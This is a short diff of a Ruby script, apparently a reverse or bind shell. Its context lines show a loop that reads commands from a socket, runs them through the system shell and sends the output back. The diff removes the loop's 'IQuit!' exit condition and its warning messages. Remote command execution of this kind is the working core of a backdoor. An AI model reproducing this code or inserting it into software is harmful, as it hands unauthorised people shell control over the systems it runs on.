@@ -49,12 +49,6 @@ begin
       res = %x{#{comm}}
       s.puts(res)
     end
-
-    #if break programm
-    break if comm =~ /IQuit!/
-    s.puts("[!] Command is not found!")
-    s.puts("[!] WARNING: It is possible target for the command to be disconnected wrong!")
-
   end
 
 rescue
@@ -98,11 +92,5 @@ rescue
       res = %x{#{comm}}
       s.puts(res)
     end
-
-    #if break programm
-    break if comm =~ /IQuit!/
-    s.puts("[!] Command is not found!")
-    s.puts("[!] WARNING: It is possible target for the command to be disconnected wrong!")
-
   end
 end
